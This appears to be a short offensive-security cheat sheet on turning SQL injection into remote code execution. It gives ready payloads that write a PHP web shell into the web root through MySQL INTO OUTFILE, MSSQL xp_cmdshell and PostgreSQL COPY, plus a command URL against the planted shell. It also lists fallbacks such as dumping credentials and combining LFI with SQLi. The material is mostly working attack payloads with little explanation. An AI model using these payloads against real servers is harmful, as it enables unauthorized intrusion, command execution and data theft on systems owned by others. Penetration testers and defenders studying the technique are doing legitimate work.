### Uploading a reverse shell via SQL Injection

#### Uploading a **reverse shell via SQL Injection (SQLi)** is an advanced exploitation technique. It depends on:

1) Type of SQL injection (Boolean-based, Error-based, Time-based, Union-based, etc.)
2) Database management system (MySQL, MSSQL, PostgreSQL, Oracle, etc.)
3) File write permissions on the server
4) Web server configurations

#### Detection:

```bash
UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/test.txt'--
```

Then check if `test.txt` is created. This confirms file writing is possible.


#### Common Scenario: SQLi File Write → Upload Reverse Shell

##### MySQL + LOAD_FILE() / INTO OUTFILE

######      Requirements:
- SQLi is **UNION-based or stacked queries** allowed
    
- MySQL has `FILE` privilege
    
- Writable path on web root (`/var/www/html/`, `C:/xampp/htdocs/`, etc.)


######     Upload using SQLi:
```bash
 UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
 ```


     Now visit:

      http://target.com/shell.php?cmd=whoami


##### Other Techniques:


######    1. MSSQL - xp_cmdshell or BCP:

If you're targeting Microsoft SQL Server and have xp_cmdshell access  
```bash 
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

######     2.PostgreSQL + COPY

```bash
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```


##### If File Write is Not Allowed

If you **can't write files**, alternatives:

###### Exploit File Upload:

- Use SQLi to change file extensions in DB to `.php`
    
- Modify file paths
    
- Change logic in DB that controls allowed extensions
    

######  Leverage SQLi to Extract Sessions or Configs:

- Dump credentials
    
- Dump file paths
    
- Use LFI + SQLi combo for RCE

